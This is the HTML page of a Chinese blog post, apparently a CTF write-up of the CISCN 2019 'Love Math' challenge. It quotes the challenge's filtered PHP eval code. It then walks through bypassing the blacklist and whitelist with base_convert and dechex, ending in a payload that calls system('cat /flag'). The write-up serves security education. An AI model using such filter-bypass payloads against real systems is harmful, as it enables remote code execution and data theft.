@@ -1,0 +1,261 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[CISCN 2019 初赛]Love Math | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[CISCN 2019 初赛]Love Math</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>&#96;&#96;&lt;?php<code> </code>error_reporting(0);<code> </code>&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag<code> </code>if(!isset($_GET[‘c’])){<br>    show_source(__FILE__);<br>}else{<br>    &#x2F;&#x2F;例子 c&#x3D;20-1<br>    $content &#x3D; $_GET[‘c’];<code>     </code>if (strlen($content) &gt;&#x3D; 80) {<code>         </code>die(“太长了不会算”);<code>     </code>}<code>     </code>$blacklist &#x3D; [‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘&#96;’, ‘[‘, ‘]‘];</p>
+<p>foreach ($blacklist as $blackitem) </p>
+<p>​	{if (preg_match(‘&#x2F;‘ . $blackitem . ‘&#x2F;m’, $content)) </p>
+<p>​		{die(“请不要输入奇奇怪怪的字符”);}}</p>
+<p>&#x2F;&#x2F;常用数学函数<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/php_ref_math.asp">http://www.w3school.com.cn/php/php_ref_math.asp</a></p>
+<p>$whitelist &#x3D; [‘abs’, ‘acos’, ‘acosh’, ‘asin’, ‘asinh’, ‘atan2’, ‘atan’, ‘atanh’, ‘base_convert’, ‘bindec’, ‘ceil’, ‘cos’, ‘cosh’, ‘decbin’, ‘dechex’, ‘decoct’, ‘deg2rad’, ‘exp’, ‘expm1’, ‘floor’, ‘fmod’, ‘getrandmax’, ‘hexdec’, ‘hypot’, ‘is_finite’, ‘is_infinite’, ‘is_nan’, ‘lcg_value’, ‘log10’, ‘log1p’, ‘log’, ‘max’, ‘min’, ‘mt_getrandmax’, ‘mt_rand’, ‘mt_srand’, ‘octdec’, ‘pi’, ‘pow’, ‘rad2deg’, ‘rand’, ‘round’, ‘sin’, ‘sinh’, ‘sqrt’, ‘srand’, ‘tan’, ‘tanh’];</p>
+<p>preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs);<br>    foreach ($used_funcs[0] as $func)</p>
+<p>{if (!in_array($func, $whitelist)) </p>
+<p>​		{die(“请不要输入奇奇怪怪的函数”);}</p>
+<p>}</p>
+<p>&#x2F;&#x2F;帮你算出答案</p>
+<p>eval(‘echo ‘.$content.’;’);<code> &#125;</code> </p>
+<p>以上就是本题代码</p>
+<p>分析一下</p>
+<p>不能传超过80个字符串以上</p>
+<p>然后是黑名单加白名单</p>
+<p>此处是不能直接用cat &#x2F;flag的</p>
+<p>要想办法构造该命令执行</p>
+<h5 id="tip："><a href="#tip：" class="headerlink" title="tip："></a>tip：</h5><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;cat/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构建</p>
+<p>?c&#x3D;($_GET[a])($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</p>
+<p>但是，a、b都不在白名单</p>
+<p>所以，我们可以直接用一些变量名替换</p>
+<p>比如</p>
+<p>?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</p>
+<p>同时_和[]是被禁用的</p>
+<p>所以，我们要找一找其他的方法</p>
+<p>可以尝试字符串转进制的方式</p>
+<p>这里可以用到hex2bin函数</p>
+<p>所以</p>
+<p>我们去找一找</p>
+<p>_GET函数就是5f 47 45 54</p>
+<p>但是hex2bin也没有在白名单啊，怎么办</p>
+<p>这个时候就可以使用base_convert</p>
+<p>base_convert()函数能够在任意进制之间转换数字</p>
+<p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p>
+<p>hex2bin&#x3D;base_convert(37907361743,10,36)</p>
+<p>之后在使用dechex将10进制的数字转化为16进制的5f 47 45 54</p>
+<p>之后就可以实现hex2bin(5f 47 45 54)的操作</p>
+<p>最终payload：</p>
+<p>&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</p>
+<p>这里是定义个变量，否则后面要写一大串，没必要</p>
+<p>直接拿下</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
